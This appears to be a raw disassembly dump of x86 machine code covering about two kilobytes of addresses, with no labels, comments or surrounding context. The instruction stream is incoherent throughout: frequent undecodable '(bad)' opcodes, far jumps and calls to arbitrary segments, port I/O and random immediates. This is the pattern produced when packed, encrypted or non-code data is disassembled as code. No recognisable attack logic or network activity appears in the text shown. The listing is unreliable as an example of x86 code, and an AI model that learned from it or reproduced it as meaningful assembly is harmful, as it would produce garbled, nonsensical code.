  40942f:	or     edi,ebp
  409431:	mov    al,ds:0x55bdd8be
  409436:	shr    DWORD PTR [esi-0x3b9a9b7d],1
  40943c:	fst    DWORD PTR [edx-0x324a2072]
  409442:	(bad)
  409445:	fcom   QWORD PTR [ecx+0x4d]
  409448:	(bad)  [eax-0x4f7a1a91]
  40944e:	mov    ah,0x4a
  409450:	jnp    0x40940b
  409452:	imul   DWORD PTR [ecx-0x10]
  409455:	and    BYTE PTR [ebp-0x72987f80],dh
  40945b:	xchg   BYTE PTR [ebx-0x3d4596e1],cl
  409461:	into   
  409462:	cs pop edi
  409464:	xor    eax,0xadcc0247
  409469:	mov    edx,0x60d0d24a
  40946e:	(bad)  
  40946f:	lods   al,BYTE PTR ds:[esi]
  409470:	or     edi,edx
  409472:	sub    DWORD PTR [edx+0x6d],0x6d56c974
  409479:	mov    cl,0x3d
  40947b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40947c:	aaa    
  40947d:	in     al,0xcc
  40947f:	add    BYTE PTR [ecx+0x70f908fc],cl
  409485:	daa    
  409486:	mov    bl,0x7f
  409488:	xchg   edx,eax
  409489:	push   0x1589d33b
  40948e:	stos   BYTE PTR es:[edi],al
  40948f:	cmp    esi,DWORD PTR [ebx]
  409491:	mov    ebx,eax
  409493:	sub    DWORD PTR [edi],ecx
  409495:	and    DWORD PTR [esi],0x2313e1f6
  40949b:	add    esp,0xffffffdc
  40949e:	clc    
  40949f:	mov    ds:0xe13fed9d,eax
  4094a4:	je     0x409451
  4094a6:	mov    cl,BYTE PTR [esi-0x45]
  4094a9:	(bad)  
  4094ab:	or     edx,DWORD PTR [ebp+0x17]
  4094ae:	out    0x5f,eax
  4094b0:	call   0x429b:0xae94ff2c
  4094b7:	out    dx,al
  4094b8:	adc    al,BYTE PTR [esi]
  4094ba:	mov    eax,0xc78d07a0
  4094bf:	inc    ebx
  4094c0:	cmp    eax,0x33a6a5c
  4094c5:	jmp    0x70fd:0x1213fef1
  4094cc:	cld    
  4094cd:	jge    0x409521
  4094cf:	das    
  4094d0:	and    dh,BYTE PTR [edi+0x660b715c]
  4094d6:	xchg   ebp,eax
  4094d7:	aaa    
  4094d8:	and    esi,DWORD PTR [esi+0x7652f9db]
  4094de:	fldcw  WORD PTR [ecx+ebp*1+0x50]
  4094e2:	repz repz cld 
  4094e5:	jge    0x409489
  4094e7:	mov    eax,0xde256197
  4094ec:	icebp  
  4094ed:	push   cs
  4094ee:	inc    ecx
  4094ef:	fidiv  DWORD PTR [ebp+0x31]
  4094f2:	jmp    0xf5d78228
  4094f7:	cmp    BYTE PTR [ebp+0xe],cl
  4094fa:	jmp    0x4094cf
  4094fc:	fs das 
  4094fe:	xlat   BYTE PTR ds:[ebx]
  4094ff:	dec    edx
  409500:	imul   edx,DWORD PTR [edx+0x6e],0xeac8e167
  409507:	pop    ss
  409508:	inc    ecx
  409509:	sbb    edx,esp
  40950b:	jge    0x4094ca
  40950d:	sub    esi,edx
  40950f:	mov    DWORD PTR [ecx+0x67],ecx
  409512:	add    edi,eax
  409514:	or     DWORD PTR [eax+0x6dc732c8],ecx
  40951a:	dec    ecx
  40951b:	sub    ebx,DWORD PTR [ecx-0x3c]
  40951e:	cmp    DWORD PTR [ebx-0x794d1433],ecx
  409524:	xchg   ecx,eax
  409525:	push   cs
  409526:	jo     0x4094c8
  409528:	push   edi
  409529:	xchg   ebx,eax
  40952a:	jb     0x40956e
  40952c:	setb   BYTE PTR [eax+0x49169a6b]
  409533:	inc    BYTE PTR [edi-0x75]
  409536:	addr16 mov cl,0x5f
  409539:	into   
  40953a:	mov    cl,0x74
  40953c:	mov    ah,0x6d
  40953e:	pushf  
  40953f:	repz push 0xf2c0d5d1
  409545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409546:	pop    es
  409547:	mov    DWORD PTR [esi+0x31583c42],edi
  40954d:	or     dh,ah
  40954f:	sbb    esi,DWORD PTR [ebx+0x4]
  409552:	ror    DWORD PTR [edi+0x79b8deea],1
  409558:	pop    ecx
  409559:	push   ds
  40955a:	bound  ecx,QWORD PTR [ecx]
  40955c:	call   0x67b7:0xe13a244a
  409563:	sub    DWORD PTR [eax+0x293ed052],ebp
  409569:	or     ch,bl
  40956b:	shl    DWORD PTR [esi+ecx*4-0x30],1
  40956f:	jns    0x409555
  409571:	loopne 0x40959e
  409573:	pop    edi
  409574:	jne    0x40952d
  409576:	xor    dh,BYTE PTR [edx-0xdc88b65]
  40957c:	es bnd jo 0x4095cc
  409580:	xchg   DWORD PTR [eax-0x7e],eax
  409583:	out    0x99,eax
  409585:	mov    ecx,0xc3753ea5
  40958a:	pop    edx
  40958b:	js     0x40959f
  40958d:	ins    DWORD PTR es:[edi],dx
  40958e:	mov    dh,0xbe
  409590:	nop
  409591:	inc    esi
  409592:	inc    edi
  409593:	aad    0x2b
  409595:	repz imul edi,DWORD PTR [edi],0xffffffe3
  409599:	dec    esi
  40959a:	gs repnz out 0x98,al
  40959e:	cmp    BYTE PTR [edi+0x2fc00323],bl
  4095a4:	mov    esp,DWORD PTR [esi+0xb8d2c8e]
  4095aa:	or     al,BYTE PTR [ebp-0x4e]
  4095ad:	sub    BYTE PTR [ebp+eax*4+0x74],dl
  4095b1:	or     ah,bh
  4095b3:	dec    eax
  4095b4:	(bad)  
  4095b5:	push   ebp
  4095b6:	out    dx,eax
  4095b7:	cli    
  4095b8:	push   ebx
  4095b9:	(bad)  
  4095ba:	lahf   
  4095bb:	cmp    eax,0x13659816
  4095c0:	pop    es
  4095c1:	lea    ebp,[edx]
  4095c3:	xchg   dl,ch
  4095c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095c6:	add    edi,ebp
  4095c8:	repnz or eax,0xfacbbc11
  4095ce:	mov    ch,0xac
  4095d0:	add    cl,BYTE PTR [ecx*1-0x524f2113]
  4095d7:	add    al,0x84
  4095d9:	shl    BYTE PTR [edx-0x75e72ba9],cl
  4095df:	bound  edi,QWORD PTR [eax]
  4095e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e2:	cmp    ecx,esi
  4095e4:	pavgw  mm2,QWORD PTR [ecx*4-0x5ab16dbb]
  4095ec:	inc    ecx
  4095ed:	dec    esi
  4095ee:	dec    edx
  4095ef:	fwait
  4095f0:	ja     0x40962f
  4095f2:	cli    
  4095f3:	sbb    cl,BYTE PTR [edx+0x67]
  4095f6:	xor    DWORD PTR [eax+eax*1],edi
  4095f9:	repnz push cs
  4095fb:	ja     0x40965f
  4095fd:	mov    bh,0xd7
  4095ff:	pop    ebp
  409600:	or     DWORD PTR ds:0x2473d05b,edx
  409606:	and    bl,BYTE PTR [esi+ebx*4]
  409609:	add    BYTE PTR [ebx-0x61],dl
  40960c:	fsub   DWORD PTR [edx+0x6de5cf73]
  409612:	dec    ebx
  409613:	loopne 0x409637
  409615:	xchg   sp,ax
  409617:	mov    cl,bh
  409619:	mov    ebx,0xdf4cd9b5
  40961e:	push   ebp
  40961f:	pop    ss
  409620:	mov    cl,0x3f
  409622:	ficomp WORD PTR [ebp+eiz*2-0x764c9e68]
  409629:	xchg   ebp,eax
  40962a:	outs   dx,DWORD PTR ds:[esi]
  40962b:	jmp    0x4c32:0xe36eb2dc
  409632:	sbb    ah,BYTE PTR [ebx+0x1637ce8d]
  409638:	scas   al,BYTE PTR es:[edi]
  409639:	aam    0x4e
  40963b:	jb     0x4096b9
  40963d:	xchg   ecx,eax
  40963e:	les    esi,FWORD PTR [ecx+0x3e]
  409641:	and    bl,BYTE PTR [ebp+0x16]
  409644:	loopne 0x409634
  409646:	mov    bh,0x18
  409648:	out    dx,al
  409649:	inc    ebx
  40964a:	out    dx,eax
  40964b:	daa    
  40964c:	inc    edx
  40964d:	jae    0x40962d
  40964f:	pop    es
  409650:	int    0xaa
  409652:	test   edi,eax
  409654:	mov    bl,0xb4
  409656:	fucomip st,st(2)
  409658:	sub    eax,DWORD PTR [ebx]
  40965a:	jb     0x409641
  40965c:	repz and al,0xc3
  40965f:	pop    ds
  409660:	jmp    0x409620
  409662:	dec    eax
  409663:	xchg   ebx,eax
  409665:	(bad)  
  409666:	fld    QWORD PTR [ebx]
  409668:	inc    eax
  409669:	out    dx,al
  40966a:	sub    eax,0xf9766a26
  40966f:	lods   al,BYTE PTR ds:[esi]
  409670:	jno    0x409668
  409672:	bound  edx,QWORD PTR [eax]
  409674:	mov    al,0x24
  409676:	aaa    
  409677:	enter  0x8543,0x79
  40967b:	push   esp
  40967c:	fsubr  QWORD PTR [ebx-0x18]
  40967f:	or     edx,DWORD PTR [edi-0x3b27decc]
  409685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409686:	mov    dl,0xc7
  409688:	sub    DWORD PTR [edi],ebp
  40968a:	dec    ecx
  40968b:	fisubr WORD PTR [edx+0x244e3020]
  409691:	sub    DWORD PTR [ebx+0x2daa4060],eax
  409697:	mov    ah,0xba
  409699:	pop    eax
  40969a:	cwde   
  40969b:	cmp    ebp,ebx
  40969d:	imul   esp,esp,0xffffffee
  4096a0:	retf   
  4096a1:	adc    al,0x1d
  4096a3:	and    al,0xd6
  4096a5:	ins    DWORD PTR es:[edi],dx
  4096a6:	iret   
  4096a7:	stos   BYTE PTR es:[edi],al
  4096a8:	adc    bl,BYTE PTR [edx+0x255b71a1]
  4096ae:	pop    ebx
  4096af:	lods   eax,DWORD PTR ds:[esi]
  4096b0:	jmp    0x6557ed43
  4096b5:	or     DWORD PTR [ebx],edi
  4096b7:	adc    DWORD PTR [ebp-0x311b4d09],ecx
  4096bd:	sti    
  4096be:	jnp    0x4096c5
  4096c0:	rcl    BYTE PTR [edx-0xef021ab],cl
  4096c6:	dec    ecx
  4096c7:	mov    esi,0xf38ba330
  4096cc:	mov    al,ds:0xf39589b8
  4096d1:	fscale 
  4096d3:	ror    DWORD PTR [ebx+edi*2+0x261e3dc],cl
  4096da:	loopne 0x409746
  4096dc:	js     0x409726
  4096de:	fidiv  DWORD PTR [ecx-0x5385c100]
  4096e4:	jle    0x409705
  4096e6:	lahf   
  4096e7:	cmp    eax,0x44824ec1
  4096ec:	push   esi
  4096ed:	sub    al,0x74
  4096ef:	add    BYTE PTR [ebp+0x68],0xa4
  4096f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096f4:	adc    cl,BYTE PTR [edx-0x25b22f8d]
  4096fa:	xchg   BYTE PTR [edi-0x4b],cl
  4096fd:	iret   
  4096fe:	popf   
  4096ff:	push   es
  409700:	lods   eax,DWORD PTR ds:[esi]
  409701:	mov    eax,cs
  409703:	push   edx
  409704:	test   DWORD PTR [ebx+0x51550947],0xe8098675
  40970e:	or     eax,0x91e81f0e
  409713:	sub    edi,esi
  409715:	pusha  
  409716:	(bad)  [ebx+0x2b]
  409719:	repz mov ah,dl
  40971c:	(bad)  [ebx+0x3cc1f9fa]
  409722:	pushf  
  409723:	out    dx,al
  409724:	cmp    BYTE PTR [edi-0x4dba99],ch
  40972a:	jmp    0x18a95bdd
  40972f:	mov    ebp,0x15bcb1c6
  409734:	fadd   st,st(6)
  409736:	push   ebx
  409737:	jl     0x40972a
  409739:	cdq    
  40973a:	or     dh,dl
  40973c:	xor    ch,BYTE PTR [esi]
  40973e:	push   ecx
  40973f:	push   0x3df5216c
  409744:	(bad)  
  409745:	sbb    al,0xee
  409747:	in     eax,dx
  409748:	mov    eax,ds:0x90848dc
  40974d:	dec    ebp
  40974e:	dec    ebx
  40974f:	adc    al,0x5b
  409751:	pop    ds
  409752:	nop
  409753:	push   eax
  409754:	cmp    bl,BYTE PTR [edx]
  409756:	mov    bl,0xf2
  409758:	fnstenv [ebx+0x3a]
  40975b:	out    dx,al
  40975c:	es jns 0x4096e6
  40975f:	inc    edi
  409760:	ret    
  409761:	xchg   DWORD PTR [edx+0x61057249],esp
  409767:	out    0x63,eax
  409769:	jb     0x4096f9
  40976b:	xlat   BYTE PTR ds:[ebx]
  40976c:	xchg   esp,eax
  40976d:	outs   dx,DWORD PTR ds:[esi]
  40976e:	ss in  al,dx
  409770:	js     0x409717
  409772:	(bad)  
  409773:	hlt    
  409774:	cld    
  409775:	xchg   esi,eax
  409776:	jno    0x409731
  409778:	retf   0x85d3
  40977b:	jne    0x4097d3
  40977d:	inc    edi
  40977e:	aaa    
  40977f:	cmp    BYTE PTR [ebx-0x2b],0x20
  409783:	data16 mov WORD PTR [esi],gs
  409786:	add    al,0x3e
  409788:	aas    
  409789:	add    eax,0x105506fe
  40978e:	cmp    edx,DWORD PTR [ebp-0x79ce125f]
  409794:	into   
  409795:	xchg   esp,eax
  409796:	mov    dl,0x2b
  409798:	pop    es
  409799:	pop    es
  40979a:	adc    eax,0x1048df55
  40979f:	aam    0xab
  4097a1:	add    al,0x68
  4097a3:	shl    BYTE PTR ds:0x843c6f56,0xc9
  4097aa:	dec    edx
  4097ab:	xchg   esi,eax
  4097ac:	int    0x81
  4097ae:	jmp    0x409801
  4097b0:	ret    0x7589
  4097b3:	pop    ds
  4097b4:	mov    al,0xc8
  4097b6:	mov    bh,0xdb
  4097b8:	sbb    al,0xcd
  4097ba:	sbb    al,0x20
  4097bc:	dec    edi
  4097bd:	mov    dh,0xd5
  4097bf:	dec    ebp
  4097c0:	inc    esi
  4097c1:	xor    al,0x89
  4097c3:	mov    al,0x56
  4097c5:	inc    edx
  4097c6:	push   edx
  4097c7:	(bad)  
  4097c9:	in     eax,dx
  4097ca:	or     BYTE PTR [eax+0x77d6da02],dh
  4097d0:	fwait
  4097d1:	xor    DWORD PTR [ecx+0x1c],ecx
  4097d4:	cmp    al,0xa6
  4097d6:	xchg   edi,eax
  4097d7:	iret   
  4097d8:	and    esi,DWORD PTR [ebx+0x4d]
  4097db:	arpl   di,ax
  4097dd:	pop    ss
  4097de:	test   esp,ebx
  4097e0:	xchg   ecx,ebx
  4097e2:	mov    ecx,0x5510d391
  4097e7:	in     eax,dx
  4097e8:	mov    ebx,0xef8a1317
  4097ed:	shl    ebx,0x67
  4097f0:	hlt    
  4097f1:	dec    ecx
  4097f2:	arpl   WORD PTR [ebx+eiz*1],di
  4097f5:	mov    edx,DWORD PTR [ebp*4+0x6d1a4834]
  4097fc:	sbb    edi,ecx
  4097fe:	dec    ecx
  4097ff:	outs   dx,BYTE PTR ds:[esi]
  409800:	pusha  
  409801:	mov    cl,0xcd
  409803:	jge    0x409830
  409805:	outs   dx,BYTE PTR ds:[esi]
  409806:	sub    esp,DWORD PTR [edx-0x27326518]
  40980c:	xchg   edi,eax
  40980d:	imul   BYTE PTR [ebx+0x6f95608c]
  409813:	shl    ecx,1
  409815:	xchg   ebx,eax
  409816:	aas    
  409817:	iret   
  409818:	lds    eax,FWORD PTR [ecx-0x6045a5e5]
  40981e:	pop    ebx
  40981f:	ror    ebp,0x9b
  409822:	dec    ecx
  409823:	data16 sub al,0x83
  409826:	in     eax,0xc4
  409828:	push   ebp
  409829:	dec    ebx
  40982a:	shl    DWORD PTR [eax+0x5546cc22],cl
  409830:	in     eax,0xd
  409832:	psubusw mm2,mm6
  409835:	jo     0x4098b2
  409837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409838:	sub    DWORD PTR [eax+0x26],esp
  40983b:	mov    ds:0x2e06dc38,al
  409840:	push   ebx
  409841:	fmul   st(7),st
  409843:	mov    ebx,0xb922635d
  409848:	fcmovne st,st(4)
  40984a:	mov    eax,ds:0xd0a10fb1
  40984f:	lods   eax,DWORD PTR ds:[esi]
  409850:	or     al,0x7d
  409852:	push   esi
  409853:	inc    ecx
  409854:	sub    al,0x31
  409856:	dec    esi
  409857:	mov    dl,0x56
  409859:	add    DWORD PTR [esi+edi*4],ebx
  40985c:	ins    BYTE PTR es:[edi],dx
  40985d:	xchg   DWORD PTR [edi+0x4f],esi
  409860:	sub    eax,0xe34b49a9
  409865:	and    bl,0x49
  409868:	les    ebx,FWORD PTR [ecx]
  40986a:	fdiv   QWORD PTR [ecx+0x4f]
  40986d:	fs push esp
  40986f:	sub    BYTE PTR [eax+eiz*8-0x30dd7a7c],dh
  409876:	xor    DWORD PTR [ebp+0x51],0x37f16f7c
  40987d:	xchg   edx,eax
  40987e:	(bad)  
  40987f:	push   cs
  409880:	xor    esi,edx
  409882:	sbb    al,0x31
  409884:	adc    al,0x9b
  409886:	xlat   BYTE PTR ds:[ebx]
  409887:	adc    DWORD PTR [ebp-0x34ecfb27],ebx
  40988d:	(bad)  
  40988e:	outs   dx,BYTE PTR ds:[esi]
  40988f:	addr16 mov ds:0xc4b8,al
  409893:	adc    al,0x17
  409895:	fadd   DWORD PTR [ecx*1+0x1b602b2b]
  40989c:	ins    DWORD PTR es:[edi],dx
  40989d:	jae    0x4098ae
  40989f:	and    DWORD PTR [eax],ebx
  4098a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098a2:	and    eax,0xde3124b
  4098a7:	add    al,0x29
  4098a9:	cwde   
  4098aa:	pop    ecx
  4098ab:	jae    0x409900
  4098ad:	cmc    
  4098ae:	fsub   DWORD PTR [ebx]
  4098b0:	or     dh,dl
  4098b2:	adc    al,bh
  4098b4:	(bad)  
  4098b5:	pop    ss
  4098b6:	scas   eax,DWORD PTR es:[edi]
  4098b7:	jmp    0x72484c2e
  4098bc:	sub    eax,0x5ca138fc
  4098c1:	add    ecx,DWORD PTR [edx-0x7113764f]
  4098c7:	sti    
  4098c8:	jecxz  0x409947
  4098ca:	ins    BYTE PTR es:[edi],dx
  4098cb:	sti    
  4098cc:	addr16 iret 
  4098ce:	or     BYTE PTR [ecx],bl
  4098d0:	push   ebx
  4098d1:	ss xchg esi,eax
  4098d3:	lods   al,BYTE PTR ds:[esi]
  4098d4:	(bad)
  4098d7:	or     eax,0xeb88ea9f
  4098dc:	lods   ax,WORD PTR ds:[esi]
  4098de:	xor    eax,0xae663f1b
  4098e3:	lods   eax,DWORD PTR ds:[esi]
  4098e4:	or     BYTE PTR [edx-0x6c3a9d93],dl
  4098ea:	les    ecx,FWORD PTR [eax-0x31]
  4098ed:	aam    0x7
  4098ef:	inc    esp
  4098f0:	out    dx,eax
  4098f1:	and    dl,cl
  4098f3:	leave  
  4098f4:	mov    eax,ds:0x52da5d25
  4098f9:	sar    dh,1
  4098fb:	mov    BYTE PTR [edx+0x4cbb3d2],dh
  409901:	in     eax,0xc9
  409903:	mov    bl,0x4e
  409905:	sub    ecx,DWORD PTR [ebp+0x16205c9f]
  40990b:	sbb    al,0xb0
  40990d:	pop    es
  40990e:	inc    ebx
  40990f:	test   BYTE PTR [ebp+esi*2+0x46],dh
  409913:	stc    
  409914:	and    DWORD PTR [ebx+0x12],ecx
  409917:	fs push esi
  409919:	es mov esi,0x756fb45d
  40991f:	push   ebx
  409920:	fdiv   DWORD PTR [edx-0x5c7895ea]
  409926:	xchg   DWORD PTR [ecx],edx
  409928:	fs mov esp,0xa7641b7b
  40992e:	scas   al,BYTE PTR es:[edi]
  40992f:	scas   eax,DWORD PTR es:[edi]
  409930:	add    al,0x8
  409932:	xor    al,BYTE PTR [edi]
  409934:	push   ecx
  409935:	(bad)  
  409936:	popf   
  409937:	dec    esi
  409938:	je     0x409989
  40993a:	int3   
  40993b:	std    
  40993c:	cmp    ebx,DWORD PTR [esi-0x5]
  40993f:	pop    ecx
  409940:	sahf   
  409941:	add    BYTE PTR [esi-0x4d8adc0c],ah
  409947:	push   ss
  409948:	sbb    esp,edi
  40994a:	rdpmc  
  40994c:	fcomp  DWORD PTR [edi]
  40994e:	push   ebx
  40994f:	rcl    DWORD PTR [ebp-0x6e16c999],cl
  409955:	or     esp,DWORD PTR [edi]
  409957:	inc    ebp
  409958:	pop    ds
  409959:	adc    BYTE PTR [edi+ebx*2-0x4a66b721],dl
  409960:	das    
  409961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409962:	add    BYTE PTR [edx+eax*2-0xdbb6668],al
  409969:	mov    ecx,esi
  40996b:	pushf  
  40996c:	inc    ecx
  40996d:	add    edi,DWORD PTR [eax]
  40996f:	fmul   DWORD PTR [edx+edx*8-0x6c151389]
  409976:	cmp    cl,BYTE PTR [esi+esi*1-0x7]
  40997a:	adc    eax,0xbee788f2
  40997f:	outs   dx,DWORD PTR ds:[esi]
  409980:	lods   eax,DWORD PTR ds:[esi]
  409981:	push   esp
  409982:	push   0xffffffd2
  409984:	jno    0x4099ae
  409986:	jecxz  0x409980
  409988:	push   edx
  409989:	loop   0x4099d9
  40998b:	mov    bl,0xfd
  40998d:	jns    0x40992e
  40998f:	dec    esi
  409990:	cwde   
  409991:	jne    0x409939
  409993:	int    0xc6
  409995:	mov    edi,gs
  409997:	push   ecx
  409998:	mov    edx,0xce4dd28f
  40999d:	nop
  40999e:	jbe    0x409a03
  4099a0:	sub    DWORD PTR [edx+0x52da2067],esp
  4099a6:	jne    0x4099a7
  4099a8:	in     eax,0xee
  4099aa:	(bad)  
  4099ab:	fsubr  st,st(2)
  4099ad:	inc    esi
  4099ae:	repnz sub esi,ecx
  4099b1:	xor    DWORD PTR [edx+ebx*4],ecx
  4099b4:	outs   dx,DWORD PTR ds:[esi]
  4099b5:	jns    0x40995f
  4099b7:	daa    
  4099b8:	retf   0x19b3
  4099bb:	inc    edi
  4099bc:	adc    al,0xda
  4099be:	inc    ebx
  4099bf:	test   BYTE PTR [eax-0x57],al
  4099c2:	cmp    eax,0xb9c31463
  4099c7:	inc    ecx
  4099c8:	cmp    al,0xbd
  4099ca:	imul   ebx,DWORD PTR [ecx+0x63],0x4edf0257
  4099d1:	ret    0x1581
  4099d4:	hlt    
  4099d5:	rol    DWORD PTR [esi-0x2363b764],0x21
  4099dc:	inc    ebp
  4099dd:	dec    ebx
  4099de:	fs std 
  4099e0:	or     DWORD PTR [esi-0x3a36e5b7],esi
  4099e6:	dec    ecx
  4099e7:	std    
  4099e8:	adc    BYTE PTR [eax],0xf3
  4099eb:	or     ch,BYTE PTR [esi-0x4d7de987]
  4099f1:	xchg   ecx,eax
  4099f2:	(bad)  
  4099f3:	jp     0x409a6b
  4099f5:	jg     0x4099d8
  4099f7:	adc    dh,BYTE PTR [ebx]
  4099f9:	nop
  4099fa:	pop    esp
  4099fb:	fimul  WORD PTR [edx]
  4099fd:	(bad)  
  4099fe:	jns    0x409a04
  409a00:	inc    eax
  409a01:	mov    edi,0x53090a77
  409a06:	sub    dl,BYTE PTR [eax]
  409a08:	dec    esi
  409a09:	pop    edx
  409a0a:	mov    edx,0xc24388ea
  409a0f:	imul   edx,DWORD PTR [ecx],0x698071b8
  409a15:	mov    bh,0xdd
  409a17:	cmp    DWORD PTR [ecx+0x7e],edx
  409a1a:	rcl    DWORD PTR ds:0xeac47686,0xd5
  409a21:	push   ecx
  409a22:	mov    ah,0x48
  409a24:	sub    BYTE PTR [edi-0xb],dl
  409a27:	gs xchg ebp,eax
  409a29:	stc    
  409a2a:	pop    edi
  409a2b:	mov    esp,DWORD PTR [eax+edi*4]
  409a2e:	adc    al,cl
  409a30:	xchg   BYTE PTR [esi],ch
  409a32:	das    
  409a33:	popf   
  409a34:	cli    
  409a35:	cdq    
  409a36:	sub    eax,0x6c3a39bc
  409a3b:	cwde   
  409a3c:	xchg   ebp,eax
  409a3d:	cdq    
  409a3e:	dec    edi
  409a3f:	jo     0x409a5c
  409a41:	mov    ebp,0xe50ac884
  409a46:	sub    edi,edi
  409a48:	and    DWORD PTR [esi-0x389a61fa],0x9d45c34f
  409a52:	mov    esp,0xb6353108
  409a57:	retf   
  409a58:	stc    
  409a59:	jno    0x4099f4
  409a5b:	leave  
  409a5c:	mov    edx,0x969b7b2f
  409a61:	ja     0x409a74
  409a63:	or     ch,bl
  409a65:	out    0xd1,al
  409a67:	mov    ds,WORD PTR [edx+0xbb602e4]
  409a6d:	adc    BYTE PTR ds:0xd0a29fb3,bh
  409a73:	sub    esi,ebp
  409a75:	sbb    al,0xf5
  409a77:	inc    edx
  409a78:	cmc    
  409a79:	daa    
  409a7a:	je     0x409a77
  409a7c:	and    eax,0xee1e3c13
  409a81:	les    ebp,FWORD PTR [edi*2-0x5b80fdb0]
  409a88:	or     cl,ah
  409a8a:	sti    
  409a8b:	leave  
  409a8c:	dec    edx
  409a8d:	push   0xffffffed
  409a8f:	test   ax,0xf0ed
  409a93:	in     al,0xd5
  409a95:	mov    al,ds:0x18c713bb
  409a9a:	ret    0x3473
  409a9d:	xor    al,0x73
  409a9f:	ds popa 
  409aa1:	jmp    0x409a86
  409aa3:	lock cmp esp,DWORD PTR [edx]
  409aa6:	dec    ebx
  409aa7:	sbb    eax,eax
  409aa9:	and    al,0xa4
  409aab:	jle    0x409a5d
  409aad:	fld    DWORD PTR [eax+0x61]
  409ab0:	push   es
  409ab1:	add    eax,0xb0593133
  409ab6:	das    
  409ab7:	jb     0x409a95
  409ab9:	jle    0x409b20
  409abb:	jg     0x409b03
  409abd:	adc    bh,BYTE PTR [eax-0x3f7ff594]
  409ac3:	jo     0x409a59
  409ac5:	mov    eax,0xeb78c244
  409aca:	mov    ds:0x1aa7dff4,eax
  409acf:	mov    esi,0x47a14b7e
  409ad4:	pop    esi
  409ad5:	push   eax
  409ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ad7:	out    dx,eax
  409ad8:	(bad)  
  409ad9:	(bad)  
  409adb:	(bad)  
  409adc:	push   ecx
  409add:	int    0xf9
  409adf:	pop    ebx
  409ae0:	mov    bh,BYTE PTR [eax-0x7e3f33d3]
  409ae6:	lahf   
  409ae7:	xlat   BYTE PTR ds:[ebx]
  409ae8:	add    BYTE PTR [eax],dl
  409aea:	mov    eax,0x5b8f4dd7
  409aef:	jnp    0x409a76
  409af1:	mov    esp,0xb6679623
  409af6:	mov    dl,0x73
  409af8:	add    ecx,DWORD PTR [edx]
  409afa:	pop    edx
  409afb:	adc    bh,BYTE PTR [esi-0x3d]
  409afe:	add    BYTE PTR [ecx+0x72],0x5
  409b02:	or     eax,0xb8fbfe99
  409b07:	les    ecx,FWORD PTR [edx+esi*4-0x66]
  409b0b:	mov    ecx,0x578bee39
  409b10:	mov    BYTE PTR [ecx-0x2e],ch
  409b13:	pushf  
  409b14:	dec    esp
  409b15:	pop    esi
  409b16:	cdq    
  409b17:	fild   DWORD PTR [esi]
  409b19:	adc    ebp,DWORD PTR [ecx]
  409b1b:	cmc    
  409b1c:	imul   ebx,ebp,0x4cc484b1
  409b22:	jmp    0x3ae452a4
  409b27:	xor    DWORD PTR [esi],ecx
  409b29:	sub    bl,ch
  409b2b:	xor    BYTE PTR [esi-0x44],bh
  409b2e:	mov    es,WORD PTR [ebx-0x6a]
  409b31:	pop    ebx
  409b32:	inc    ebx
  409b33:	mov    bh,0xf5
  409b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b36:	mov    dl,0x2a
  409b38:	mov    edi,0x1a54df0f
  409b3d:	sbb    bh,BYTE PTR [ebx+eax*8]
  409b40:	das    
  409b41:	les    ecx,FWORD PTR [edi+0x74868b24]
  409b47:	pop    es
  409b48:	sar    BYTE PTR [ebp+0x694a355f],0x45
  409b4f:	jns    0x409ad9
  409b51:	jmp    0x409adf
  409b53:	pop    es
  409b54:	xlat   BYTE PTR ds:[ebx]
  409b55:	(bad)  
  409b56:	in     eax,0x49
  409b58:	loope  0x409b61
  409b5a:	inc    esi
  409b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b5c:	add    eax,0x5bcf1aaa
  409b61:	mov    bh,0xe
  409b63:	pop    DWORD PTR [edi+0x52]
  409b66:	rol    DWORD PTR [ebx-0x4b],cl
  409b69:	mov    dl,0xa6
  409b6b:	iret   
  409b6c:	push   edi
  409b6d:	xchg   ecx,eax
  409b6e:	rcl    ah,0x56
  409b71:	cmp    BYTE PTR [ebp+0x49142766],cl
  409b77:	jge    0x409b0c
  409b79:	mov    al,BYTE PTR [esp+ebx*8+0x5b31698d]
  409b80:	repz dec ebx
  409b82:	scas   eax,DWORD PTR es:[edi]
  409b83:	out    dx,eax
  409b84:	cmp    DWORD PTR [ebp-0x40757284],esi
  409b8a:	lahf   
  409b8b:	or     eax,0xc096b9f0
  409b90:	pop    es
  409b91:	xchg   edx,ebp
  409b93:	outs   dx,BYTE PTR ds:[esi]
  409b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b95:	pop    ebp
  409b96:	ret    0x3c83
  409b99:	arpl   ax,bp
  409b9b:	mov    esi,0xb7782378
  409ba0:	arpl   WORD PTR [edx],di
  409ba2:	fnstcw WORD PTR [ebp-0x5]
  409ba5:	div    DWORD PTR [ebp+ebp*8-0x6f054b6d]
  409bac:	add    al,0xc3
  409bae:	and    eax,0x969039cc
  409bb3:	jl     0x409be3
  409bb5:	and    al,ah
  409bb7:	xchg   ecx,eax
  409bb8:	scas   al,BYTE PTR es:[edi]
  409bb9:	loopne 0x409b57
  409bbb:	popf   
  409bbc:	pop    ecx
  409bbd:	jne    0x409b4e
  409bbf:	test   eax,0xf275e3e4
  409bc4:	mov    bh,0xeb
  409bc7:	in     eax,dx
  409bc8:	pop    edi
  409bc9:	cs (bad) 
  409bcb:	fld    TBYTE PTR ds:0x1e88229b
  409bd1:	pop    esi
  409bd2:	test   eax,0x3c259157
  409bd7:	fdivr  st,st(3)
  409bd9:	and    eax,0xe25b65f6
  409bde:	ja     0x409b9f
  409be0:	jo     0x409c49
  409be2:	fstp   TBYTE PTR gs:[ecx]
  409be5:	add    DWORD PTR fs:[edx+0x64],esp
  409be9:	inc    eax
  409bea:	xchg   edi,eax
  409beb:	adc    BYTE PTR [ecx],dl
  409bed:	dec    esi
  409bee:	(bad)  
  409bef:	add    ch,BYTE PTR [eax+0x63]
  409bf2:	and    cl,BYTE PTR [ebx]
